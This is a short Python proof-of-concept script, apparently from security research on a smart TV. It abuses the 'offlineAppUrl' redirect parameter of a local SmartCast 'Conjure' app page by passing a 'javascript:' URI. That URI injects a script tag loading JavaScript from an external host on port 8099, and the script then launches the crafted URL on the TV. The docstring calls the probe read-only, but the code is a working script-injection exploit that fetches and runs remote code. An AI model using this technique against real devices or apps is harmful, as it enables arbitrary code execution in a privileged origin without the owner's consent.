#!/usr/bin/env python3
"""Test Conjure's reviewed redirect with read-only browser capability inventory.

Executes our capability probe through the installed spinner's URL redirect.
Never invokes the vendor native binding, SDK, internal credential endpoint,
browser storage writes, worker registration, native configuration or updates.
"""
import argparse
import ipaddress
import json
import urllib.parse

import tvctl


def prepare(bind):
    script_url = f'http://{bind}:8099/loopback-inventory.js'
    code = "void(document.head.appendChild(Object.assign(document.createElement('script'),{src:" + json.dumps(script_url) + "})))"
    url = 'http://127.0.0.1:12345/scfs/conjure/index.html?' + urllib.parse.urlencode({
        'offlineAppUrl':'javascript:'+code,
    })
    tvctl.save_private('loopback-origin-probe.json',{'url':url,'script':code,'scope':'Read-only capability/registration metadata, no native binding calls or storage writes'})
    return url


def main():
    parser=argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--bind',required=True)
    parser.add_argument('--launch',action='store_true')
    args=parser.parse_args()
    url=prepare(str(ipaddress.IPv4Address(args.bind)))
    print('Prepared bounded read-only probe; URL length:',len(url))
    if args.launch:
        state=tvctl.request('GET','/state_extended')
        if state.get('CURRENT_INPUT',{}).get('NAME')!='SMARTCAST':
            raise RuntimeError('SmartCast input is not active; no launch sent')
        print('Loopback origin test:',tvctl.launch(url)['STATUS']['RESULT'])


if __name__=='__main__':
    try:
        main()
    except (OSError,RuntimeError) as error:
        print('Stopped:',str(error))
        raise SystemExit(1)
